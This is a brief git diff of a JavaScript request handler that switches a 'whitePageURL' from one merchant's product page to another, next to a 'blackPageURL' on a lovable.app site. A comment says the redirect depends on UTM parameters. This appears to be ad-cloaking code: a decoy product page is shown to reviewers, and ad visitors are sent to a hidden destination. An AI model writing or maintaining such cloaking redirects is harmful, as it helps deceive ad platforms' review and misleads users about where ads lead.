@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.jild.pk/products/handmade-leather-watch-strap-for-apple-crocostyle";
+    const whitePageURL = "https://www.buckleguy.com/b2020-1-26mm-pvd-rainbow-key-ring-solid-iron/";
     const blackPageURL = "https://streammagic.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
